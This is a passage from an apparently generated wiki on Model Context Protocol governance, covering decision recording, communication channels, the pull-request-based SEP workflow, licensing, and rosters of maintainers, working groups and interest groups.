| Private Discord Channels | Security, people matters, urgent coordination | As needed | Limited access |

**Meeting Structure:**
- Core maintainer group meets bi-weekly
- Lead, core, and maintainer groups attempt to meet in person every 3-6 months
- Working Groups and Interest Groups maintain their own schedules (published on [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/))

**Sources:** [docs/community/governance.mdx:74-77](), [docs/community/governance.mdx:126-133](), [docs/community/communication.mdx:9-54]()

### Decision Recording

All decisions are documented and made publicly available:

```mermaid
graph TB
    subgraph "Decision Types and Records"
        Tech["Technical Decisions"]
        Spec["Specification Changes"]
        Process["Process Changes"]
        Gov["Governance Decisions"]
    end
    
    subgraph "Documentation Locations"
        Issues["GitHub Issues<br/>github.com/modelcontextprotocol/<br/>modelcontextprotocol/issues"]
        SEPs["SEPs Directory<br/>seps/*.md<br/>Pull request based"]
        Changelog["Specification Changelog<br/>modelcontextprotocol.io/<br/>specification/draft/changelog"]
        CommDocs["Community Documentation<br/>modelcontextprotocol.io/<br/>community/governance"]
    end
    
    subgraph "Required Context"
        Context["Decision Record Must Include:<br/>- Decision makers<br/>- Background/motivation<br/>- Options considered<br/>- Rationale<br/>- Implementation steps"]
    end
    
    Tech --> Issues
    Tech --> SEPs
    Spec --> Changelog
    Spec --> SEPs
    Process --> CommDocs
    Process --> SEPs
    Gov --> Issues
    Gov --> SEPs
    
    Issues -.contains.-> Context
    SEPs -.contains.-> Context
    CommDocs -.contains.-> Context
```

**Transparency Requirements:**
- All technical and governance decisions affecting the community must be documented
- Must be recorded in GitHub Discussions and/or Issues
- Private channel discussions must be summarized publicly (except for security and people matters)
- Discord discussions leading to decisions must be moved to GitHub for persistent record
- Meeting notes must be published (usually as GitHub issues or public Google Docs)

**Sources:** [docs/community/communication.mdx:89-105](), [docs/community/governance.mdx:32-34](), [docs/community/communication.mdx:42-53]()

## Communication Channels

### Technical Governance Channels

The governance process uses a shared Discord server for coordination:

```mermaid
graph LR
    subgraph "Discord Server Structure"
        Shared["Shared Discord Server<br/>All maintainers, core, lead"]
        Public["Public Channels<br/>- Working Groups<br/>- Interest Groups<br/>- SDK development<br/>- Project development"]
        Private["Private Channels<br/>- Security incidents<br/>- People matters<br/>- Core maintainer decisions<br/>- Urgent coordination"]
    end
    
    subgraph "GitHub Integration"
        GHIssues["GitHub Issues<br/>Actionable tasks<br/>Bug reports"]
        GHDiscuss["GitHub Discussions<br/>Long-form discussion<br/>Proposals"]
        GHPRs["GitHub Pull Requests<br/>SEPs (seps/*.md)<br/>Code changes"]
    end
    
    subgraph "Decision Flow"
        Discord["Discord Discussion"]
        GitHub["GitHub Record"]
        Persistent["Persistent Documentation<br/>Searchable history"]
        
        Discord -->|"must transition to"| GitHub
        GitHub -->|"becomes"| Persistent
    end
    
    Shared --> Public
    Shared --> Private
    Public -.link to.-> GHDiscuss
    Public -.link to.-> GHPRs
    Private -.summarize in.-> GHIssues
```

**Discord Usage:**
- Technical governance facilitated through shared Discord
- Each maintainer group can choose additional channels
- All decisions and supporting discussions must be recorded transparently
- Private channels only for: security incidents, people matters, read-only decision channels, urgent coordination requiring focused response

**GitHub Usage:**
- GitHub Issues for bug reports, feature tracking, development tasks
- GitHub Discussions for structured long-form discussion, roadmap planning, feature requests
- SEP proposals submitted as pull requests to `seps/` directory (not as issues)
- Security issues use private reporting process in [SECURITY.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md)

**Sources:** [docs/community/governance.mdx:32-34](), [docs/community/communication.mdx:19-54](), [docs/community/communication.mdx:56-80]()

## Specification Enhancement Process (SEP)

The SEP process is the primary mechanism for proposing major protocol changes. As of November 2025, SEPs use a pull request-based workflow:

```mermaid
graph TD
    Draft["1. Draft SEP<br/>Create 0000-feature.md<br/>in seps/ directory"]
    PR["2. Create Pull Request<br/>Add to seps/ directory"]
    Renumber["3. Rename File<br/>Use PR number<br/>PR #1850 → 1850-feature.md"]
    Sponsor["4. Find Sponsor<br/>Tag maintainer from<br/>MAINTAINERS.md"]
    Assign["5. Sponsor Assigns<br/>Updates status to 'draft'<br/>Applies PR labels"]
    Review["6. Informal Review<br/>Sponsor + community feedback<br/>Discussion in PR comments"]
    Formal["7. Formal Review<br/>Status → 'in-review'<br/>Core Maintainers review"]
    Decision{"8. Resolution"}
    Accepted["Accepted<br/>Reference implementation<br/>required"]
    Rejected["Rejected"]
    Withdrawn["Withdrawn"]
    Final["Final<br/>Implementation complete<br/>In protocol release"]
    Dormant["Dormant<br/>No sponsor in 6 months"]
    
    Draft --> PR
    PR --> Renumber
    Renumber --> Sponsor
    Sponsor --> Assign
    Assign --> Review
    Review --> Formal
    Formal --> Decision
    Decision --> Accepted
    Decision --> Rejected
    Decision --> Withdrawn
    Sponsor -.timeout.-> Dormant
    Accepted --> Final
```

**SEP Workflow:**
1. Draft SEP as markdown file: `seps/0000-feature-title.md`
2. Create pull request to `seps/` directory
3. Rename file using PR number (e.g., PR #1850 becomes `seps/1850-feature-title.md`)
4. Find sponsor from maintainer list
5. Sponsor assigns themselves and updates status to `draft`
6. Informal review with community feedback
7. Sponsor moves to `in-review` for formal Core Maintainer review
8. Core Maintainers accept, reject, or request revision
9. If accepted, complete reference implementation
10. Sponsor updates to `final` when implementation is incorporated

**SEP States:**
- `draft`: Proposal with sponsor, undergoing informal review
- `in-review`: Ready for formal Core Maintainer review
- `accepted`: Accepted by Core Maintainers, reference implementation pending
- `rejected`: Rejected by Core Maintainers
- `withdrawn`: Withdrawn by author
- `final`: Reference implementation complete and incorporated
- `superseded`: Replaced by newer SEP
- `dormant`: No sponsor found within six months

**Sponsor Responsibilities:**
- Review proposal and provide feedback
- Request changes based on community input
- **Update SEP status** in markdown file and PR labels
- Initiate formal review when ready
- Present at Core Maintainer meetings
- Ensure quality standards are met
- Track reference implementation progress

**Sources:** [docs/community/sep-guidelines.mdx:43-66](), [docs/community/sep-guidelines.mdx:83-94](), [docs/community/sep-guidelines.mdx:120-130](), [seps/1850-pr-based-sep-workflow.md:1-181]()

## Legal and Policy Framework

The MCP project operates under the Linux Foundation Projects umbrella:

| Aspect | Policy |
|--------|--------|
| Legal Entity | Model Context Protocol, a Series of LF Projects, LLC |
| Trademark Policy | https://www.lfprojects.org/policies/ |
| Governance Changes | Must be approved by LF Projects, LLC |
| Copyright | Contributors retain copyright as independent works |
| Code License | Apache License, Version 2.0 |
| Specification License | Apache License, Version 2.0 |
| Documentation License | Creative Commons Attribution 4.0 International |
| Alternative Licenses | Core Maintainers may approve exceptions on case-by-case basis |

**Key Principles:**
- Membership is for individuals, not companies
- No seats reserved for specific companies
- Maintainers act in the best interests of the protocol and open source community
- No requirement to assign copyrights to the project
- All governance policies located at https://www.lfprojects.org/policies/

**Sources:** [GOVERNANCE.md:1-11](), [docs/community/governance.mdx:8-18](), [docs/community/governance.mdx:30-31]()

## File References

The governance structure is defined and documented in the following files:

| File | Purpose | Key Sections |
|------|---------|--------------|
| [MAINTAINERS.md:1-181]() | Official list of all current maintainers | Lead Maintainers (7-10), Core Maintainers (12-20), SDK Maintainers (22-79), Project Maintainers (80-112), WG/IG Maintainers (121-175) |
| [docs/community/governance.mdx:1-185]() | Comprehensive governance documentation | Technical Governance (20-78), Maintainer roles (36-72), Decision Process (74-77), SEP Process (115-124), Nomination Process (136-171) |
| [GOVERNANCE.md:1-11]() | LF Projects policies and legal framework | General project policies, licensing, copyright |
| [docs/community/sep-guidelines.mdx:1-142]() | SEP submission guidelines | SEP format (68-79), SEP states (83-94), Sponsor role (120-130) |
| [seps/1850-pr-based-sep-workflow.md:1-185]() | Current SEP workflow specification | PR-based workflow (32-72), Status management (109-117) |
| [docs/community/working-interest-groups.mdx:1-130]() | Working and Interest Group structure | IG expectations (31-60), WG expectations (71-100), Facilitator role (108-114) |
| [docs/community/communication.mdx:1-107]() | Communication channel policies | Discord (19-54), GitHub usage (56-80), Decision records (89-105) |

---

# Page: Maintainers and Roles

# Maintainers and Working Groups

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)

</details>



This page documents the current roster of maintainers across the Model Context Protocol project, organized by their areas of responsibility. The MCP project maintains three primary categories of maintainers: **SDK Maintainers** (covering 10 language implementations with 25 maintainers), **Project Maintainers** (covering 4 core projects with 12 maintainers), and **Working Group/Interest Group Maintainers** (covering 7 active groups).

For information about maintainer roles, responsibilities, and the governance hierarchy, see [Governance Structure](#8.1). For details about the WG/IG lifecycle, creation process, and expectations, see [Working Groups and Interest Groups](#8.3).

**Note:** This roster is maintained in [MAINTAINERS.md:1-167]() and was last updated October 15, 2025.

## Maintainer Hierarchy

The MCP steering group consists of lead maintainers, core maintainers, and specialized maintainers organized by their domain expertise:

### Maintainer Hierarchy with Current Members

```mermaid
graph TB
    subgraph "Lead Maintainers"
        LEAD1["David Soria Parra<br/>@dsp-ant"]
        LEAD2["Justin Spahr-Summers<br/>@jspahrsummers<br/>(currently inactive)"]
    end
    
    subgraph "Core Maintainers"
        CORE1["Inna Harper<br/>@ihrpr"]
        CORE2["Basil Hosmer<br/>@bhosmer-ant"]
        CORE3["Paul Carleton<br/>@pcarleton"]
        CORE4["Nick Cooper<br/>@nicknotfun"]
        CORE5["Nick Aldridge<br/>@000-000-000-000-000"]
        CORE6["Che Liu"]
        CORE7["Den Delimarsky<br/>@localden"]
    end
    
    subgraph "Specialized Maintainers"
        SDK["SDK Maintainers<br/>25 maintainers<br/>10 SDKs"]
        PROJ["Project Maintainers<br/>12 maintainers<br/>4 projects"]
        WGIG["WG/IG Maintainers<br/>7 groups"]
    end
    
    subgraph "Community"
        MOD["Community Moderators<br/>5 moderators"]
    end
    
    LEAD1 & LEAD2 -->|"appoint/remove"| CORE1 & CORE2 & CORE3 & CORE4 & CORE5 & CORE6 & CORE7
    CORE1 & CORE2 & CORE3 & CORE4 & CORE5 & CORE6 & CORE7 -->|"appoint/remove"| SDK
    CORE1 & CORE2 & CORE3 & CORE4 & CORE5 & CORE6 & CORE7 -->|"appoint/remove"| PROJ
    CORE1 & CORE2 & CORE3 & CORE4 & CORE5 & CORE6 & CORE7 -->|"appoint/remove"| WGIG
    
    LEAD1 & LEAD2 & CORE1 & CORE2 & CORE3 & CORE4 & CORE5 & CORE6 & CORE7 -.->|"oversee"| MOD
```

**Sources:** [MAINTAINERS.md:7-21](), [docs/community/governance.mdx:10-16]()

## SDK Maintainers

SDK maintainers are responsible for implementing and maintaining the Model Context Protocol specification in their respective programming languages. Each SDK operates as an independent repository with its own contribution process and release cycle.

### SDK Maintainer Distribution

```mermaid
graph LR
    subgraph "SDK Ecosystem"
        TS["TypeScript SDK<br/>3 maintainers<br/>@ihrpr, @felixweinberger,<br/>@ochafik"]
        PY["Python SDK<br/>4 maintainers<br/>@ihrpr, @jerome3o,<br/>@samuelcolvin, @Kludex"]
        JAVA["Java SDK<br/>3 maintainers<br/>@tzolov, @chemicL,<br/>@Kehrlann"]
        CS["C# SDK<br/>2 maintainers<br/>@halter73,<br/>@mikekistler"]
        GO["Go SDK<br/>3 maintainers<br/>@findleyr, @jba,<br/>@samthanawalla"]
        RUST["Rust SDK<br/>1 maintainer<br/>@alexhancock"]
        SWIFT["Swift SDK<br/>2 maintainers<br/>@mattt,<br/>@carlpeaslee"]
        RUBY["Ruby SDK<br/>3 maintainers<br/>@topherbullock, @koic,<br/>@atesgoral"]
        PHP["PHP SDK<br/>2 maintainers<br/>@CodeWithKyrian,<br/>@chr-hertel"]
        KOTLIN["Kotlin SDK<br/>2 maintainers<br/>@e5l,<br/>@ignatov"]
    end
    
    TIER1["Tier 1: Mature<br/>3-4 maintainers"] -.-> TS
    TIER1 -.-> PY
    TIER1 -.-> JAVA
    TIER1 -.-> RUBY
    
    TIER2["Tier 2: Established<br/>2-3 maintainers"] -.-> CS
    TIER2 -.-> GO
    TIER2 -.-> SWIFT
    TIER2 -.-> PHP
    TIER2 -.-> KOTLIN
    
    TIER3["Tier 3: Emerging<br/>1 maintainer"] -.-> RUST
```

**Sources:** [MAINTAINERS.md:22-78]()

### SDK Maintainer Details

| SDK | Maintainers | GitHub Handles |
|-----|-------------|----------------|
| **TypeScript** | 3 | Inna Harper (@ihrpr), Felix Weinberger (@felixweinberger), Olivier Chafik (@ochafik) |
| **Python** | 4 | Inna Harper (@ihrpr), Jerome Swannack (@jerome3o), Samuel Colvin (@samuelcolvin), Marcelo Trylesinski (@Kludex) |
| **Java** | 3 | Christian Tzolov (@tzolov), Dariusz Jędrzejczyk (@chemicL), Daniel Garnier-Moiroux (@Kehrlann) |
| **Ruby** | 3 | Topher Bullock (@topherbullock), Koichi Ito (@koic), Ateş Göral (@atesgoral) |
| **Go** | 3 | Rob Findley (@findleyr), Jonathan Amsterdam (@jba), Sam Thanawalla (@samthanawalla) |
| **Swift** | 2 | Matt Zmuda (@mattt), Carl Peaslee (@carlpeaslee) |
| **C#** | 2 | Stephan Halter (@halter73), Mike Kistler (@mikekistler) |
| **Kotlin** | 2 | Leonid Stashevsky (@e5l), Sergey Ignatov (@ignatov) |
| **PHP** | 2 | Kyrian Obikwelu (@CodeWithKyrian), Christopher Hertel (@chr-hertel) |
| **Rust** | 1 | Alex Hancock (@alexhancock) |

**Sources:** [MAINTAINERS.md:22-78]()

## Project Maintainers

Project maintainers oversee specific infrastructure and tooling projects within the MCP ecosystem. These projects provide essential functionality for the broader community.

### Project Maintainer Structure

```mermaid
graph TB
    subgraph "Core Projects"
        USEMCP["use-mcp<br/>React hooks library"]
        INSPECTOR["Inspector<br/>Developer testing tool"]
        REGISTRY["Registry<br/>Server discovery"]
        REFSERV["Reference Servers<br/>Example implementations"]
    end
    
    subgraph "use-mcp Maintainers"
        USEMCP_M1["Glen Maddern<br/>@geelen"]
    end
    
    subgraph "Inspector Maintainers"
        INSP_M1["Ola Hungerford<br/>@olaservo"]
        INSP_M2["Cliff Hall<br/>@cliffhall"]
    end
    
    subgraph "Registry Maintainers"
        REG_M1["Toby Padilla<br/>@toby"]
        REG_M2["Tadas Antanavicius<br/>@tadasant"]
        REG_M3["Adam Jones<br/>@domdomegg"]
        REG_M4["Radoslav Dimitrov<br/>@rdimitrov"]
    end
    
    subgraph "Reference Servers Maintainers"
        REF_M1["Ola Hungerford<br/>@olaservo"]
        REF_M2["Cliff Hall<br/>@cliffhall"]
        REF_M3["Tadas Antanavicius<br/>@tadasant"]
        REF_M4["Shaun Smith<br/>@evalstate"]
        REF_M5["Jonathan Hefner<br/>@jonathanhefner"]
    end
    
    USEMCP --> USEMCP_M1
    INSPECTOR --> INSP_M1 & INSP_M2
    REGISTRY --> REG_M1 & REG_M2 & REG_M3 & REG_M4
    REFSERV --> REF_M1 & REF_M2 & REF_M3 & REF_M4 & REF_M5
```

**Sources:** [MAINTAINERS.md:79-104]()

### Project Details

| Project | Purpose | Maintainers | Count |
|---------|---------|-------------|-------|
| **use-mcp** | React hooks library for MCP integration | Glen Maddern | 1 |
| **Inspector** | Interactive developer tool for testing MCP servers | Ola Hungerford, Cliff Hall | 2 |
| **Registry** | Centralized server discovery and listing service | Toby Padilla, Tadas Antanavicius, Adam Jones, Radoslav Dimitrov | 4 |
| **Reference Servers** | Example MCP server implementations (filesystem, git, memory, etc.) | Ola Hungerford, Cliff Hall, Tadas Antanavicius, Shaun Smith, Jonathan Hefner | 5 |

**Sources:** [MAINTAINERS.md:79-104]()

## Working Group and Interest Group Maintainers

Working Groups (WGs) and Interest Groups (IGs) organize collaborative efforts around specific topics. While facilitators can be informal community members, maintainers provide official representation from the MCP steering group.

### Working and Interest Group Structure

```mermaid
graph TB
    subgraph "Interest Groups (Exploration)"
        SEC_IG["Security IG<br/>Protocol security<br/>best practices"]
        AUTH_IG["Authorization IG<br/>OAuth 2.1<br/>implementation"]
        CLIENT_IG["Client Implementor IG<br/>Client development<br/>coordination"]
        FIN_IG["Financial Services IG<br/>Enterprise adoption"]
        TRANS_IG["Transports IG<br/>Transport layer<br/>enhancements"]
    end
    
    subgraph "Working Groups (Deliverables)"
        IDENT_WG["Server Identity WG<br/>Server identification<br/>SEPs"]
        AGENTS_WG["Agents WG<br/>Agentic workflows<br/>SEPs"]
    end
    
    subgraph "Security IG Maintainers"
        SEC_M1["Den Delimarsky<br/>@dend"]
        SEC_M2["Paul Carleton<br/>@pcarleton"]
        SEC_M3["Jenn Newton<br/>@jenn-newton"]
    end
    
    subgraph "Authorization IG Maintainers"
        AUTH_M1["Aaron Parecki<br/>@aaronpk"]
        AUTH_M2["Darin McAdams<br/>@D-McAdams"]
        AUTH_M3["Paul Carleton<br/>@pcarleton"]
    end
    
    subgraph "Client Implementor IG"
        CLIENT_M1["Alex Hancock - Goose"]
        CLIENT_M2["Ben Brandt - Zed"]
        CLIENT_M3["Connor Peet - VS Code"]
        CLIENT_M4["Gabriel Peal - Codex"]
        CLIENT_M5["Jun Han - JetBrains"]
        CLIENT_M6["Tyler Leonhardt - VS Code"]
        CLIENT_M7["Michael Feldstein - Cursor"]
    end
    
    subgraph "Financial Services IG"
        FIN_M1["Sambhav Kothari<br/>@sambhav"]
    end
    
    subgraph "Transports IG Maintainers"
        TRANS_M1["Kurtis Van Gent<br/>@kurtisvg"]
        TRANS_M2["Jonathan Hefner<br/>@jonathanhefner"]
        TRANS_M3["Shaun Smith<br/>@evalstate"]
        TRANS_M4["Harvey Tuch<br/>@htuch"]
    end
    
    subgraph "Server Identity WG"
        IDENT_M1["Nick Cooper<br/>@nicknotfun"]
    end
    
    subgraph "Agents WG Maintainers"
        AGENTS_M1["Peter Alexander<br/>@pja-ant"]
        AGENTS_M2["Luca Chang<br/>@LucaButBoring"]
        AGENTS_M3["Inna Harper<br/>@ihrpr"]
    end
    
    SEC_IG --> SEC_M1 & SEC_M2 & SEC_M3
    AUTH_IG --> AUTH_M1 & AUTH_M2 & AUTH_M3
    CLIENT_IG --> CLIENT_M1 & CLIENT_M2 & CLIENT_M3 & CLIENT_M4 & CLIENT_M5 & CLIENT_M6 & CLIENT_M7
    FIN_IG --> FIN_M1
    TRANS_IG --> TRANS_M1 & TRANS_M2 & TRANS_M3 & TRANS_M4
    IDENT_WG --> IDENT_M1
    AGENTS_WG --> AGENTS_M1 & AGENTS_M2 & AGENTS_M3
```

**Sources:** [MAINTAINERS.md:113-161]()

### Working and Interest Group Details

| Group Type | Name | Focus | Maintainers | Count |
|------------|------|-------|-------------|-------|
| **IG** | Security | Protocol security, vulnerability management | Den Delimarsky, Paul Carleton, Jenn Newton | 3 |
| **IG** | Authorization | OAuth 2.1 implementation, token management | Aaron Parecki, Darin McAdams, Paul Carleton | 3 |
| **IG** | Client Implementor | Client development coordination, protocol representatives | Alex Hancock (Goose), Ben Brandt (Zed), Connor Peet (VS Code), Gabriel Peal (Codex), Jun Han (JetBrains), Tyler Leonhardt (VS Code), Michael Feldstein (Cursor) | 7 |
| **IG** | Financial Services | Enterprise adoption, compliance | Sambhav Kothari | 1 |
| **IG** | Transports | Transport layer enhancements (STDIO, HTTP, WebSocket) | Kurtis Van Gent, Jonathan Hefner, Shaun Smith, Harvey Tuch | 4 |
| **WG** | Server Identity | Server identification mechanisms, SEP development | Nick Cooper | 1 |
| **WG** | Agents | Agentic workflows, multi-agent coordination | Peter Alexander, Luca Chang, Inna Harper | 3 |

**Sources:** [MAINTAINERS.md:113-161]()

**Note:** The Client Implementor Interest Group members serve as protocol representatives for their respective clients. For client-specific issues, users should use official support channels for each product rather than contacting these maintainers directly [MAINTAINERS.md:129-131]().

## Community Moderators

Community Moderators handle day-to-day management of community spaces, including Discord moderation, facilitating discussions, and ensuring adherence to the Code of Conduct.

### Current Community Moderators

| Name | GitHub Handle |
|------|---------------|
| Ola Hungerford | @olaservo |
| Cliff Hall | @cliffhall |
| Shaun Smith | @evalstate |
| Jonathan Hefner | @jonathanhefner |
| Tadas Antanavicius | @tadasant |

**Sources:** [MAINTAINERS.md:105-111]()

## Maintainer Responsibilities by Domain

Different maintainer types have distinct responsibilities within the MCP ecosystem:

### Responsibility Matrix

```mermaid
graph TB
    subgraph "SDK Maintainers"
        SDK_R1["Implementation of<br/>MCP specification"]
        SDK_R2["Language-specific APIs"]
        SDK_R3["Release management"]
        SDK_R4["SDK documentation"]
    end
    
    subgraph "Project Maintainers"
        PROJ_R1["Tool development"]
        PROJ_R2["Infrastructure maintenance"]
        PROJ_R3["User documentation"]
        PROJ_R4["Community support"]
    end
    
    subgraph "WG/IG Maintainers"
        WG_R1["Facilitate discussions"]
        WG_R2["SEP sponsorship"]
        WG_R3["Meeting coordination"]
        WG_R4["Deliverable tracking"]
    end
    
    subgraph "Core Responsibilities (All)"
        CORE_R1["Community engagement"]
        CORE_R2["Code reviews"]
        CORE_R3["Mentoring contributors"]
        CORE_R4["Alignment with<br/>MCP philosophy"]
    end
    
    SDK_R1 & SDK_R2 & SDK_R3 & SDK_R4 --> CORE_R1 & CORE_R2 & CORE_R3 & CORE_R4
    PROJ_R1 & PROJ_R2 & PROJ_R3 & PROJ_R4 --> CORE_R1 & CORE_R2 & CORE_R3 & CORE_R4
    WG_R1 & WG_R2 & WG_R3 & WG_R4 --> CORE_R1 & CORE_R2 & CORE_R3 & CORE_R4
```

**Sources:** [docs/community/governance.mdx:24-37]()

### General Maintainer Responsibilities

All maintainers across SDKs, projects, and working groups share these core expectations [docs/community/governance.mdx:28-34]():

- **Thoughtful and productive engagement** with community contributors
- **Maintaining and improving** their respective area of the MCP project
- **Supporting documentation**, roadmaps, and adjacent parts of the MCP project
- **Presenting ideas** from community to core maintainers

## Maintainer Appointment Process

Maintainers can only be appointed and removed by core maintainers or lead maintainers at any time and without requiring justification [docs/community/governance.mdx:35-36](). The nomination process follows a structured workflow defined in [docs/community/governance.mdx:138-158]().

### Nomination Workflow

| Step | Actor | Action | Location |
|------|-------|--------|----------|
| 1 | Nominator | Collect evidence of contributions (merged PRs, reviews) | Local preparation |
| 2 | Nominator | Discuss with existing maintainers in relevant group | Discord/private discussion |
| 3 | Nominator | Request private channel creation via Community Moderator or Core Maintainer | Discord DM |
| 4 | Core/Lead | Create `nomination-{name}-{group}` private channel | Discord |
| 5 | Nominator | Provide context: GitHub profile, group(s), contributions, capacity | Discord channel |
| 6 | Core/Lead | Create Discord Poll for Yes/No vote | Discord channel |
| 7 | Core/Lead | Discuss and vote (consensus encouraged, not required) | Discord channel |
| 8 | Admin | Update GitHub and Discord roles if approved | GitHub, Discord |
| 9 | Nominator | Announce new maintainership in relevant public channel | Discord |
| 10 | Admin | Delete nomination channel after one week | Discord |

**Sources:** [docs/community/governance.mdx:138-158]()

## WG/IG Facilitators vs Maintainers

The distinction between facilitators and maintainers in Working Groups and Interest Groups [MAINTAINERS.md:113-115]():

| Role | Status | Requirements | Responsibilities |
|------|--------|--------------|-----------------|
| **Facilitator** | Informal, self-nominated | None | Shepherd discussions, organize meetings |
| **Maintainer** | Official MCP steering group representative | Appointed by core/lead maintainers | Sponsor SEPs, advocate for initiatives, maintain deliverables |

**Note:** A facilitator role does **not** automatically grant maintainership status across the MCP organization [docs/community/working-interest-groups.mdx:108-110]().

## Active Group Communication

All active Working Groups and Interest Groups publish their meeting schedules on the public MCP community calendar at [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/). Each group maintains a dedicated Discord channel in the MCP Contributor Discord server [docs/community/working-interest-groups.mdx:25-29]().

For information about creating new groups, lifecycle management, and meeting expectations, see [Working Groups and Interest Groups](#8.3).

**Sources:** [docs/community/working-interest-groups.mdx:1-130](), [MAINTAINERS.md:1-167](), [docs/community/governance.mdx:1-173]()

---

# Page: Working Groups and Interest Groups

# Working Groups and Interest Groups

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



This document describes the collaborative group structures within the Model Context Protocol's governance: **Working Groups** (WGs) and **Interest Groups** (IGs). These groups facilitate focused discussions, problem identification, and deliverable production within specific areas of the MCP ecosystem.

For information about the overall governance structure and maintainer hierarchy, see [Governance Structure](#7.1). For communication channels used by these groups, see [Communication Channels](#7.4). For the process of proposing specification changes, see [Specification Enhancement Process (SEP)](#6.2).

## Purpose and Scope

Working Groups and Interest Groups exist to:

- Facilitate high-signal spaces for focused discussions among contributors who opt into notifications, expertise sharing, and regular meetings
- Establish clear expectations and leadership roles to guide collaborative efforts
- Enable meaningful contributions and knowledge sharing in specific MCP sub-topics
- Produce concrete deliverables (SEPs, implementations, maintained projects)

Sources: [docs/community/working-interest-groups.mdx:16-22]()

## Interest Groups vs Working Groups

### Interest Groups (IGs)

**Goal**: Facilitate discussion and knowledge-sharing among MCP contributors who share interests in a specific MCP sub-topic or context. Primary focus is on identifying and gathering problems that may be worth addressing through SEPs or other community artifacts.

**Key Characteristics**:
- Problem identification and exploration
- Open discussion format
- No strict deliverable requirements
- Can inform Working Group creation
- No expiration date if active

**Examples**:
- Security in MCP
- Auth in MCP
- Using MCP in enterprise settings
- Tooling and practices for hosting MCP servers
- Tooling and practices for implementing MCP clients

Sources: [docs/community/working-interest-groups.mdx:31-49]()

### Working Groups (WGs)

**Goal**: Facilitate collaboration within the MCP community on a SEP, a themed series of SEPs, or an otherwise officially endorsed project.

**Key Characteristics**:
- Deliverable-focused (SEPs or maintained projects)
- Progress tracking requirements
- Clear work items (Issues/PRs)
- Retirement when objectives complete
- May maintain long-term projects (SDKs, Inspector, Registry)

**Examples**:
- Registry
- Inspector
- Tool Filtering
- Server Identity
- Agents Working Group

Sources: [docs/community/working-interest-groups.mdx:71-88]()

## Group Structure and Roles

### Facilitators vs Maintainers

```mermaid
graph TB
    subgraph "Group Leadership Roles"
        FACILITATOR["Facilitator<br/>(Informal Role)"]
        MAINTAINER["Maintainer<br/>(Official MCP Steering Group)"]
    end
    
    subgraph "Responsibilities"
        F_SHEPHERD["Shepherd discussions"]
        F_ORGANIZE["Organize meetings"]
        F_COMMUNICATE["Communicate status"]
        
        M_ADVOCATE["Advocate for changes"]
        M_REPRESENT["Official representation"]
        M_SPONSOR["Sponsor SEPs"]
    end
    
    subgraph "Appointment Process"
        SELF_NOM["Self-nomination<br/>Anyone can facilitate"]
        FORMAL_NOM["Formal nomination<br/>See governance.mdx"]
    end
    
    FACILITATOR --> F_SHEPHERD
    FACILITATOR --> F_ORGANIZE
    FACILITATOR --> F_COMMUNICATE
    FACILITATOR --> SELF_NOM
    
    MAINTAINER --> M_ADVOCATE
    MAINTAINER --> M_REPRESENT
    MAINTAINER --> M_SPONSOR
    MAINTAINER --> FORMAL_NOM
    
    NOTE["Note: Facilitator role does NOT<br/>result in maintainership<br/>across MCP organization"]
```

**Facilitator**: Informal role responsible for helping shepherd discussions and collaboration within an IG or WG. Anyone can self-nominate. Does not confer maintainership status in the MCP organization.

